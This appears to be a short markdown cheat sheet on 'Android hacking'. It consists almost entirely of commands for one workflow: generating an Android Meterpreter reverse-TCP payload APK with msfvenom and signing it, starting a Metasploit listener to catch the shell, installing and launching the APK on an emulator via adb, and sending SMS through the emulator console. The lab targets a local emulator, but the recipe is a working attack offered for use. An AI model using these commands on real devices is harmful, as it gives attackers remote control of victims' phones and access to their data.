# Android Hacing

## Create an APK
```
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.2.2 LPORT=4444 R > SignApk/evilAndroid.apk
```

## Signing APK
```
java -jar signapk.jar certificate.pem key.pk8 evilAndroid.apk evilAndroidc.apk
```

## Start Metasploit Listener
```
msfconsole -L -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST 127.0.0.1; set LPORT 4444; run"
```

## start android emulator
```
android-sdk-linux/tools/emulator @android17 -no-window 
```

## Install APK
```
adb install SignApk/evilAndroidc.apk
```

## Open the app
```
adb shell am start com.metasploit.stage/.MainActivity
```

## Sending SMS
```
telnet localhost 5554
```
```
sms send 1112223333 "Hey there"
```